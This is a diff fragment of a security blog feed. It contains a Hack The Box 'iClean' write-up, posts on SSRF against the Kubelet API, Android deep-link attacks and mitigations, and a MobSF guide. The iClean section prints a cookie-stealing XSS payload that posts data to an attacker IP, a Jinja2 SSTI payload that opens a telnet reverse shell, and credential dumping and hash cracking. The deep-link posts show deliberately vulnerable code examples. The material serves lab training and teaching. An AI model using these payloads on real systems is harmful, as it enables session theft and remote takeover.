+app.run(host=&apos;0.0.0.0&apos;, port=9000)
+</code></pre><p>Now, let&apos;s build our payload:</p><figure class="kg-card kg-code-card"><pre><code>(function () {
+    const attackers_ip = &apos;10.10.14.69&apos;;
+    const flask_api_port = &apos;9000&apos;;
+    var exfil_data = function(data) {
+        encoded_data = encodeURIComponent(data);
+        fetch(
+            `http://${attackers_ip}:${flask_api_port}/api/exfil?encoding=base64`,
+            {
+                method: &apos;POST&apos;,
+                headers: { &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot; },
+                body: &quot;data=&quot; + encoded_data
+            }
+        );
+    }
+    var attack = function() {
+        try {
+            exfil_data(btoa(document.cookie))
+        } catch(error) {
+            fetch(`http://${attackers_ip}?debug=${error.message}`)
+        }
+    }
+    attack();
+}());</code></pre><figcaption>exfil_cookie.js</figcaption></figure><p>It seems like the JS file is being invoked but not executed ... </p><pre><code>Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.12 - - [02/Aug/2024 15:48:01] &quot;GET /exfil_cookie.js HTTP/1.1&quot; 200 -</code></pre><p>After some tweaking we get a working payload:</p><pre><code>POST /sendMessage HTTP/1.1
+Host: capiclean.htb
+User-Agent: python-requests/2.32.3
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 211
+
+service=%3Cimg%20src%3Dx%20onerror%3D%22var%20script1%3Ddocument.createElement%28%27script%27%29%3Bscript1.src%3D%27http%3A//10.10.14.69%3A80/exfil_cookie.js%27%3Bdocument.head.appendChild%28script1%29%3B%22/%3E
+
+// Decoded: 
+// &lt;img src=x onerror=&quot;var script1=document.createElement(&apos;script&apos;);script1.src=&apos;http://10.10.14.69:80/exfil_cookie.js&apos;;document.head.appendChild(script1);&quot;/&gt;</code></pre><p>We have a cookie!</p><pre><code>session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0</code></pre><hr><h2 id="from-auth-bypass-to-rce">From Auth Bypass to RCE</h2><p>With this cookie we can now access the <code>dashboard</code> page:</p><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-16.08.11.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1212" height="683" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-16.08.11.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-16.08.11.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-16.08.11.png 1212w" sizes="(min-width: 1200px) 1200px"><figcaption>http://capiclean.htb/dashboard</figcaption></figure><p>We can generate a new invoice, which generates an ID:</p><pre><code>POST /InvoiceGenerator HTTP/1.1
+Host: capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0
+
+selected_service=Basic+Cleaning&amp;qty=1&amp;project=abc&amp;client=abc&amp;address=abc&amp;email-address=admin%40capiclean.htb</code></pre><p>The IDs are not sequential:</p><pre><code>2481856170 
+7829583255
+7193822935</code></pre><p>With these IDs we can generate a QR code:</p><pre><code>POST /QRGenerator HTTP/1.1
+Host: capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0
+
+form_type=invoice_id&amp;invoice_id=2481856170</code></pre><p>The response contains a URL that points to a QR code:</p><pre><code class="language-html">&lt;p&gt;QR Code Link: &lt;a href=&quot;http://capiclean.htb/static/qr_code/qr_code_2481856170.png&quot; target=&quot;_blank&quot;&gt;http://capiclean.htb/static/qr_code/qr_code_2481856170.png&lt;/a&gt;&lt;/p&gt;</code></pre><p>This link can then be used to generate a &quot;scannable invoice&quot;:</p><pre><code>POST /QRGenerator HTTP/1.1
+Host: capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0
+
+invoice_id=&amp;form_type=scannable_invoice&amp;qr_link=http%3A%2F%2Fcapiclean.htb%2Fstatic%2Fqr_code%2Fqr_code_2481856170.png</code></pre><p>It looks like when a valid image is found, its content is base64-encoded and embedded in the response:</p><pre><code class="language-html">&lt;div class=&quot;qr-code&quot;&gt;
+&lt;img src=&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGIAAABiAQAAAACD3jujAAABTElEQVR4nL3UPaplMQgAYMFWcCuCreDWA2mFbCVgG3Ay583APXjrl+6DgPEvUB9nwC8IMOeAZRu8yXP52WhZXaKOkfMofhNFivJ3LZ+5ML/IM3YFz//xPgWozxHouolk6b33L79PHQkRS6rZZYE2tsSxLhJVDJpnd6GFuVUUd00Ihp0Gz6vf4kJKTdzepVurnGlBl1DKMruv78o5bQxWfrJ9i3yzLzHDLgGyIYfGE/2t2y8N9VSpLj3TaAoMb5oEY0ZkPRHeqrx3+WB6VzIzDphRXVO0DNP0p54v7RW4yHBL1y37AIzw+CI7lg5yRjUd2WORWK0uOTqB3Ry7AEeSxTD2Ltp35GrfVjfxFLtTOQG67ggQnRvjp2YvAbqMQ6bYdTcHh6U4edNdxCXCBPxN9LeRdw2+6WYUIWRdz88w6LB2Ac4Mp6NcTb/71/0BhwD5EVZWwGQAAAAASUVORK5CYII=&quot; alt=&quot;QR Code&quot;&gt;
+&lt;/div&gt;</code></pre><p>Playing around with this field, we find that it&apos;s likely vulnerable to <code>SSTI</code>:</p><pre><code>POST /QRGenerator HTTP/1.1
+Host: capiclean.htb
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqxaVg.NOZsmSfBZjwVvCVLRC7gIpLywb0
+Upgrade-Insecure-Requests: 1
+
+invoice_id=&amp;form_type=scannable_invoice&amp;qr_link={{7*7}}</code></pre><pre><code>&lt;div class=&quot;qr-code-container&quot;&gt;&lt;div class=&quot;qr-code&quot;&gt;&lt;img src=&quot;data:image/png;base64,49&quot; alt=&quot;QR Code&quot;&gt;&lt;/div&gt;
+&lt;/body&gt;</code></pre><p>After some trial and error (and with a lot of help from <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">this</a> article), we get a working RCE:</p><pre><code>{%with a=request|attr(&quot;application&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&apos;\x5f\x5fgetitem\x5f\x5f&apos;)(&apos;\x5f\x5fimport\x5f\x5f&apos;)(&apos;os&apos;)|attr(&apos;popen&apos;)(&apos;telnet 10.10.14.69 4444 | /bin/sh | telnet 10.10.14.69 4445&apos;)|attr(&apos;read&apos;)()%}{%print(a)%}{%endwith%}</code></pre><p>Let&apos;s upgrade the <code>telnet</code> shell and enumerate:</p><pre><code>python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><pre><code>$ ls -la
+-rw-r--r-- 1 root root 12553 Mar  2 07:29 app.py
+drwxr-xr-x 6 root root  4096 Sep 27  2023 static
+drwxr-xrwx 2 root root  4096 Aug  2 17:30 templates
+
+$ cat app.py
+
+[...]
+db_config = {
+    &quot;host&quot;: &quot;127.0.0.1&quot;,
+    &quot;user&quot;: &quot;iclean&quot;,
+    &quot;password&quot;: &quot;pxCsmnGLckUb&quot;,
+    &quot;database&quot;: &quot;capiclean&quot;
+}
+[...]
+
+$ mysql -u iclean -ppxCsmnGLckUb capiclean
+
+&gt; select * from users;
+
+| id | username | password | role_id |
++----+----------+----------+----------------------------------+
+|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
+|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
++----+----------+------------+----------------------------------+
+2 rows in set (0.00 sec)</code></pre><p>Let&apos;s crack <code>consuela</code>&apos;s hash:</p><pre><code>~ hashcat -a 0 -m 1400 consuela_hash.txt ../../../rockyou.txt --status --status-timer=10 -w 3 --show
+
+0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa:simple and clean</code></pre><p>As expected, we can now SSH into the machine as <code>consuela</code>:</p><pre><code>~ ssh consuela@capiclean.htb
+consuela@capiclean.htb&apos;s password: simple and clean
+
+[...]
+You have mail.
+Last login: Fri Aug  2 14:10:18 2024 from 10.10.14.108
+
+consuela@iclean:~$ cat user.txt
+163c1a080901773d156dfa33fe4a4d3e</code></pre>]]></content:encoded></item><item><title><![CDATA[Exploiting SSRF in Kubernetes]]></title><description><![CDATA[<p>While testing an API that was exposed to the Internet, I found an unauthorised SSRF vulnerability that allowed me to trick the server into performing any <code>GET</code> request using <code>http</code> or <code>https</code> protocol.</p><p>I had access to the response (i.e.: this wasn&apos;t a blind SSRF), full control</p>]]></description><link>inesmartins.github.io/exploiting-ssrf-in-k8s-environment/</link><guid isPermaLink="false">660ac0a92ac6400bb040b8bf</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 01 Apr 2024 17:30:11 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/04/6.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/04/6.png" alt="Exploiting SSRF in Kubernetes"><p>While testing an API that was exposed to the Internet, I found an unauthorised SSRF vulnerability that allowed me to trick the server into performing any <code>GET</code> request using <code>http</code> or <code>https</code> protocol.</p><p>I had access to the response (i.e.: this wasn&apos;t a blind SSRF), full control of the URI, but, as expected, could not control the request headers. Also, there was no rate limit.</p><p>While writing my report I explained how this vulnerability could be abused to bypass security controls, enumerate internal hosts and services, and even perform DoS attacks on third parties or internal services.</p><p>However, I wanted to go one step further.</p><p>I knew the containerised application ran on a GKE cluster, so I wanted to see how much of the internal <code>k8s</code> configuration I could exfiltrate.</p><p>After coming across <a href="https://www.assetnote.io/resources/research/cloudflare-pages-part-3-the-return-of-the-secrets">this post</a> I found that the <a href="https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html">Kubelet API</a> allows you to retrieve information about each pod running on the host by calling the following endpoint:</p><pre><code>http://&lt;host_ip&gt;:10255/pods</code></pre><p>As described in <a href="https://www.deepnetwork.com/blog/2020/01/13/kubelet-api.html">the documentation</a>:</p><blockquote>The information is very detailed and includes the metadata, labels, annotations, owner references (for example the DaemonSet that owns the pod), volumes, containers, and status.</blockquote><p>The response was a gold mine.</p><p>Note that I was also able to trigger unauthorised requests that relate to metrics, but the results were not as relevant:</p><pre><code>http://&lt;host_ip&gt;:10255/metrics
 http://&lt;host_ip&gt;:10255/metrics/cadvisor
 http://&lt;host_ip&gt;:10255/metrics/probes</code></pre><p>Let me know if you come across other ways to exploit this vulnerability ;)</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Vessel (user-only)]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/vessel">here</a>.</em></p><hr><p>As per usual, let&apos;s start by configuring <code>vessel.htb</code> as a virtual host:</p><pre><code>~ sudo nano /etc/hosts
 
@@ -891,65 +1567,4 @@ root@79931c1ed9a2:/# wget http://10.10.14.22:9000/Makefile
 root@79931c1ed9a2:/# export PATH=/usr/lib/gcc/x86_64-linux-gnu/8/:$PATH
 root@79931c1ed9a2:/# make clean
 root@79931c1ed9a2:/# make
-root@79931c1ed9a2:/# insmod reverse-shell.ko</code></pre><p>And that&apos;s it!</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-02-at-14.13.45.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><hr><h2 id="references">References</h2><ul><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1</a></li><li><a href=" https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html">https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html</a></li><li><a href="https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/">https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/</a></li><li><a href="https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</a></li><li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></li><li><a href="https://alexander.holbreich.org/docker-components-explained/">https://alexander.holbreich.org/docker-components-explained/</a></li><li><a href="https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md">https://github.com/zweilosec/htb-writeups/blob/master/linux-machines/hard/quick-write-up.md</a></li><li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mounted-docker-socket</a></li><li><a href="https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">https://www.secureideas.com/blog/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html</a></li><li><a href="https://blog.nody.cc/posts/container-breakouts-part2/">https://blog.nody.cc/posts/container-breakouts-part2/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 4 (Mitigation)]]></title><description><![CDATA[<h2 id="preventing-deep-link-hijacking">Preventing Deep Link Hijacking</h2><p>When it comes to preventing Deep Link Hijacking, the message is simple: stop using Scheme URLs and start using (properly verified) App Links or Intent URLs.</p><p>[If you&apos;re lost maybe you should go back to <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>]</p><p>As of August 2021 <a href="https://www.appbrain.com/stats/top-android-sdk-versions">only about 6%</a></p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-4-mitigation/</link><guid isPermaLink="false">614cd409fec7b20db8a36f01</guid><category><![CDATA[deep links]]></category><category><![CDATA[android]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 23 Sep 2021 20:10:50 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/09/maxresdefault-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<h2 id="preventing-deep-link-hijacking">Preventing Deep Link Hijacking</h2><img src="inesmartins.github.io/content/images/2021/09/maxresdefault-1-1.jpeg" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)"><p>When it comes to preventing Deep Link Hijacking, the message is simple: stop using Scheme URLs and start using (properly verified) App Links or Intent URLs.</p><p>[If you&apos;re lost maybe you should go back to <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>]</p><p>As of August 2021 <a href="https://www.appbrain.com/stats/top-android-sdk-versions">only about 6% of Android devices</a> were still using Android 5 (Lollipop) or earlier versions of the OS, which don&#x2019;t support App Links. So at this point, there are not a lot of excuses to still use Scheme URLs, which are insecure by design.</p><p>However, as discussed on <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part1/index.html">Part 1</a>, App Links can be tricky to verify correctly. Luckily, there are some tools that can help with this task.</p><p>Google provides a <a href="https://support.google.com/google-ads/answer/10710301?hl=en">Deep Link Validator</a> in their Ads platform as well as a <a href="https://developers.google.com/digital-asset-links/tools/generator">Statement List Generator and Tester</a>. This tools enables you to test if a given site domain grants app deep linking to the app with the specified name and <code>SHA256</code> fingerprint:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.36.11.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>I found this tool to be insufficient, and couldn&apos;t find any other tool that gave me all of the information I needed about an application&apos;s App Links.</p><p>As such, I ended up developing <a href="https://github.com/inesmartins/Android-App-Link-Verification-Tester">an open source tool</a> that, among other things, can help you check if the App Links registered on the application are correctly verified:</p><pre><code>~ python3 Android-Deep-Link-Analyser/deeplink_analyser.py \
--apk com.twitter.android.apk \
--p com.twitter.android \
--op verify-applinks</code></pre><p>The output looks something like:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-23-at-20.40.32.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>This tool has a lot of other features that might interested you. <br>Also, if you have any ideas, corrections or suggestions I would love to receive them on Github!</p><hr><h2 id="validating-untrusted-data">Validating Untrusted Data</h2><p>As a general rule, you should treat all data received via deep link as being potentially malicious. As such, this data should be properly <strong>validated</strong>, <strong>sanitized </strong>and <strong>encoded</strong>.</p><p>If you remember, a lot of the vulnerabilities we explored on the previous posts could have been prevented if the developers checked a given URL against an allowlist.</p><p>However, when parsing and checking URLs we should keep in mind that a lot of <a href="https://hackerone.com/reports/431002">popular URL parsers have known vulnerabilities</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://lh5.googleusercontent.com/KTZM2xQgLFfena7OJJakPkLnvyX3lcAdQVdinLeaIxuCVskdMO3g2es-7UT8u6kzU2532AjrJiCFFZtu2aEFl8y7ph7TyprwHTsDgYJJrcO6KN_CborYhhSlOZLTWfVTlwVc5wK7Qyw=s0" class="kg-image" alt="Exploiting Deep Links in Android - Part 4 (Mitigation)" loading="lazy"></figure><p>Note that this issue is now fixed for API 28 - triggering a deep links with a malformed URL loads the attacker&apos;s scripts in Chrome rather than the app&#x2019;s <code>WebView</code> - but this is still valid for older APIs.</p><hr><h2 id="webview-hardening">WebView Hardening</h2><p>As we saw on the previous posts, <code>WebViews</code> can potentially lead to <strong>local file exfiltration,</strong> they can allow a malicious user to <strong>access data</strong> created by other applications, and they&apos;re vulnerable to common web vulnerabilities.</p><p>So, when it comes to <code>WebViews</code> we should first ask ourselves: &quot;could we replace it with a native Android UI component?&quot; </p><p>If the answer is &quot;Yes&quot; we should go with the native approach.</p><p>If the answer is &quot;No&quot; we should enforce the following settings, unless absolutely necessary:</p><pre><code class="language-JavaScript">setJavaScriptEnabled(false);
-setAllowFileAccess(false);
-setAllowContentAccess(false);
-setAllowFileAccessFromFileURLs(false);
-setAllowUniversalAccessFromFileURLs(false);
-setJavaScriptCanOpenWindowsAutomatically(false);
-setMixedContentMode(1);</code></pre><p>You should also be careful when using the following options:</p><pre><code class="language-JavaScript">setDomStorageEnabled
-setCacheMode
-setAppCacheEnabled + setAppCachePath
-setGeolocationEnabled +setGeolocationDatabasePath</code></pre><p>Note that these settings are safe by default on &quot;modern&quot; Android APIs, but you should verify if the app developer has not explicitly set an insecure configuration.</p><p>Finally, if your app directs users to URLs outside your domain, consider using <a href="https://developer.chrome.com/docs/android/custom-tabs/overview/">Chrome Custom Tabs</a> instead of a <code>WebView</code>:</p><blockquote>CCT opens faster than a browser and, if preloaded via its warm-up call, is potentially even faster than a WebView. While it still runs Javascript, it is in its own process, which prevents apps from running malicious code. Furthermore, the CCT UI provides an action bar which shows the URL of the page being loaded, along with an SSL verification lock icon for secure pages.</blockquote><hr><p>Hopefully, you&apos;re now better equipped to protect your application.<br>On the <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-pat-5-testing/index.html">next post</a> we&apos;ll explore Testing methodologies.</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 3]]></title><description><![CDATA[<p>So .. what else can we do with deep links?</p><hr><h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2><p>In <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">part 2</a> we saw how to achieve LFI via the <code>WebView.loadUrl</code> method. In this part we&apos;ll explore an alternative that doesn&apos;t require the application to contain a <code>WebView</code>. </p><p>Let&apos;s</p>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-part-3/</link><guid isPermaLink="false">61325b65ca603212098f5e4b</guid><category><![CDATA[android]]></category><category><![CDATA[deep links]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 04 Sep 2021 20:07:17 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/09/maxresdefault-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/09/maxresdefault-1.jpeg" alt="Exploiting Deep Links in Android - Part 3"><p>So .. what else can we do with deep links?</p><hr><h2 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h2><p>In <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-2/index.html">part 2</a> we saw how to achieve LFI via the <code>WebView.loadUrl</code> method. In this part we&apos;ll explore an alternative that doesn&apos;t require the application to contain a <code>WebView</code>. </p><p>Let&apos;s continue using the <code>ABC Bank</code> Android application as an example, and imagine that their customer support team uses deep links to help customers see important information displayed inside the app.</p><p>But in this case, instead of a parameter that specifies a web page, the deep link contains the path to a local file, e.g.:</p><pre><code>abcbank://help?file=how-to-enable-mfa.txt</code></pre><p>When the application receives this deep link, it opens the local file, reads its contents and displays in inside a <code>TextView</code>, as shown below:</p><pre><code class="language-Android">String file = getIntent().getData().getQueryParameter(&apos;file&apos;);
-
-AssetManager am = getAssets()
-InputStream is = am.open(file);
-BufferedReader r = new BufferedReader(new InputStreamReader(is));
-StringBuilder str_to_display = &quot;&quot;;
-
-for (String line; (line = r.readline()) != null; ) {
-    str_to_display.append(line).append(&apos;\n&apos;);
-}
-
-TextView tv = findViewById(R.id.myTextView);
-tv.setText(str_to_display.toString());</code></pre><p>So, what&apos;s the danger here? Surely if a user sees their <em>own</em> local data displayed on the screen that&apos;s not much of an issue.</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-05-at-10.59.34.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 3" loading="lazy"></figure><p>Well, for starters it depends on whether or not the application enforces any validations when it comes to the files that can be specified via deep link. If there aren&apos;t any validations, then it all comes down to the data can be accessed from the application.</p><p>Note, for example, that if the application includes the <a href="https://developer.android.com/reference/android/Manifest.permission#READ_EXTERNAL_STORAGE">READ_EXTERNAL_STORAGE</a> permission, it can access files stored in shared directories, including those generated by other apps (note that since API 29 this is not possible since all storage is scoped).</p><p>So, it&apos;s not much of a leap to imagine that a malicious application could write a file to a shared directory that would then be read by the victim app. </p><p>Depending on the <code>WebView</code> configurations, this local file could then read all of the application files and exfiltrate them to an attacker-controlled server.</p><p>The attack surface can also be expanded if the application has access to <a href="https://developer.android.com/guide/topics/providers/content-providers">Content Providers</a>, which are interfaces that allow multiple apps to share data.</p><h2 id="cross-site-request-forgery-csrf">Cross-Site Request Forgery (CSRF)</h2><p>Usually, when we talk about CSRF, we&apos;re exploiting some Cookie (mis)configuration in order to trick a user into performing an unintended action. A typical scenario would be a phishing link that performs a <code>GET</code> request that does some sort of account state change.</p><p>The same scenario is possible in Android if the application registers a deep link that &quot;automatically&quot; performs an action without any additional confirmation from the user.</p><p>A very straightforward example of this was <a href="https://hackerone.com/reports/583987">reported in 2019</a> on the Periscope app: in short, it was possible to trick a user of the Periscope application into following another user of the app, simply by tricking the victim into clicking on a deep link similar to:</p><pre><code>pscp://user/&lt;any-user-id&gt;/follow
-</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-05-at-11.11.37-1.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 3" loading="lazy" width="443" height="650"></figure><p>The application, in essence, behaves as the browser by authenticating and sending the request without confirming with the user if they want to perform said action. And the impact is basically whatever feature is supported by the app itself.</p><h2 id="remote-code-execution-rce">Remote Code Execution (RCE)</h2><p>Achieving RCE is theoretically possible, but very unlikely, since it would require very poor judgement on the part of the application&apos;s developers.</p><p>Let&apos;s go back to the <code>ABC Bank</code> Android app. Their customer support team knows that some OS versions have specific bugs, but their clients are not tech-savvy enough to check the OS by themselves, so they send them a deep link such as this one:</p><pre><code>abcbank://help?cmd=cat%20/system/build.prop</code></pre><p>When the application receives this deep link, it executes the <code>cat /system/build.prop</code> command using <a href="https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html">Runtime.getRuntime().exec()</a>, and then the output is displayed on a <code>TextView</code>, just as before:</p><pre><code>String command = getIntent().getData().getQueryParameter(&apos;cmd&apos;);
-Process process = Runtime.getRuntime().exec(command)
-
-InputStreamReader isr = InputStreamReader(process.inputStream);
-BufferedReader r = new BufferedReader(isr);
-StringBuilder str_to_display = &quot;&quot;;
-
-for (String line; (line = r.readline()) != null; ) {
-    str_to_display.append(line).append(&apos;\n&apos;);
-}
-
-TextView tv = findViewById(R.id.myTextView);
-tv.setText(str_to_display.toString());</code></pre><p>The client then simply reads the output to the customer support agent, which can then take that info into account when supporting the user.</p><p>In this scenario and without any additional validations, it would be possible for an attacker to remotely execute commands on the device by simply tricking a victim into clicking a deep link such as:</p><pre><code>deeplink://path?cmd=&lt;the-evil-command&gt;</code></pre><p>But, again, it would be a sign of very poor judgement to allow a user to specify commands directly via deep link, particularly without any additional validations, and proof of that is the fact that I couldn&apos;t find any actual examples of RCE reported in the wild.</p><hr><p>And that&apos;s it for now! On the next post I&apos;ll look into <a href="https://inesmartins.github.io/exploiting-deep-links-in-android-part-4-mitigation/index.html">Mitigation</a>.</p>]]></content:encoded></item><item><title><![CDATA[MobSF "IPA Binary Analysis" | Step by Step]]></title><description><![CDATA[<p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> is an open source static and dynamic analysis tool for Android and iOS, which can be used to quickly detect major issues on your mobile application.</p><p>When scanning an <code>.ipa</code>, the &quot;IPA Binary Analysis&quot; section can report multiple issues that can be hard to interpret. </p><p>Hopefully this</p>]]></description><link>inesmartins.github.io/mobsf-ipa-binary-analysis-step-by-step/</link><guid isPermaLink="false">6116ea0cfd1c6c08ebabac74</guid><category><![CDATA[ipa]]></category><category><![CDATA[mobsf]]></category><category><![CDATA[binary analysis]]></category><category><![CDATA[rev]]></category><category><![CDATA[apple]]></category><category><![CDATA[binary exploitation]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 21 Aug 2021 21:57:25 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.17.13.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-22-at-10.17.13.png" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step"><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">MobSF</a> is an open source static and dynamic analysis tool for Android and iOS, which can be used to quickly detect major issues on your mobile application.</p><p>When scanning an <code>.ipa</code>, the &quot;IPA Binary Analysis&quot; section can report multiple issues that can be hard to interpret. </p><p>Hopefully this article will help you understand why each vulnerability was reported and how to fix it.</p><hr><h2 id="getting-to-the-good-stuff">Getting to the good stuff</h2><p><code>.ipa</code> files are actually just zipped files that include the application executable and a bunch of other stuff.</p><p>When we talk about binary analysis, we&apos;re actually just talking about analysing this executable file, so the first thing we need to do is <strong>find it</strong>.</p><p>Note that if you don&apos;t have access to the <code>.ipa</code> you can extract it from the App Store using <a href="https://github.com/majd/ipatool">ipatool</a>:</p><pre><code>~ brew tap majd/repo
-~ brew install ipatool
-~ ipatool download --bundle-identifier &lt;app-bundle-id&gt; --email &lt;appstore-account-email&gt; --password &lt;appstore-account-password&gt;
-</code></pre><p>So, now that you have your <code>.ipa</code> it&apos;s time to unzip it and look inside:</p><pre><code>~ unzip MyApp.ipa
-~ cd Payload/
-~ cd MyApp.app/
-~ file MyApp
-MyApp: Mach-O 64-bit executable arm64</code></pre><p>As you can see above, the app binary is compiled for <code>ARM</code> and uses the <code>Mach-O</code> file format.</p><p>A more thorough analysis of this binary can be done using <a href="https://www.manpagez.com/man/1/otool/">otool</a>. You should become familiar with this tool since it will help us validate and fix most of the issues reported below.</p><p>Alternatively, I also recommend <a href="https://h3adsh0tzz.com/projects/htool/">htool</a>, which serves the similar purpose of analysing <code>Mach-O</code> binaries.</p><hr><h2 id="arc">ARC</h2><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.27.png" class="kg-image" alt="MobSF &quot;IPA Binary Analysis&quot; | Step by Step" loading="lazy" width="1125" height="102" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-21-at-20.12.27.png 600w, inesmartins.github.io/content/images/size/w1000/2021/08/Screenshot-2021-08-21-at-20.12.27.png 1000w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-21-at-20.12.27.png 1125w"></figure><p>If you&apos;re used to working with Swift, then you most likely know <code>ARC</code> or &quot;Automatic Reference Counting&quot; simply as <a 